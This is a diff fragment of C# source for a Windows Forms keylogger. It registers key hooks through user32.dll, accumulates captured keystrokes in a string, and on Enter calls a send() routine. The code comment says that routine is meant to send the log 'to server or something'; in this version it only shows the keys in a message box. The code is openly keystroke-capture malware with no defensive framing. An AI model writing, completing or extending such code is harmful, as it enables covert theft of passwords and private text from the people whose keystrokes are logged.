@@ -13,7 +13,7 @@ namespace KeyLogger
 {
     public partial class MainForm : Form
     {
-        string logFile = "C:\\pressed.txt";
+        string logs = "";
         [DllImport("user32.dll")]
         public static extern bool RegisterHotKey(IntPtr hWnd, int id, int fsModifiers, int vlc);
         [DllImport("user32.dll")]
@@ -46,17 +46,19 @@ namespace KeyLogger
         void store(int code)
         {
             char key = (char)code;
-            File.AppendAllText(logFile, key + "");
+            logs += key;
             if (code == 13)
             {
                 // Send the log (to server or something)
-                File.Delete(logFile);
+                send();
             }
             SendKeys.Send(key + "");
         }
 
         void send()
         {
+            MessageBox.Show(logs);
+            logs = "";
         }
 
         private void MainForm_Shown(object sender, EventArgs e)
